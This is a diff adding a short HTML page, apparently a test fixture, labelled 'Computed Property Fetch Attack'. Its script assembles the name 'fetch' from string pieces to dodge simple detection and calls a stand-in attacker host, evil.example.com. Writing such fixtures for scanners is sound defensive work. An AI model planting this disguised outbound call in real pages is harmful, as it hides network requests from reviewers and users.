@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Computed Property Fetch Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: Computed property access to fetch
+    const method = 'fe' + 'tch';
+    window[method]('https://evil.example.com/data');
+  </script>
+</body>
+</html>
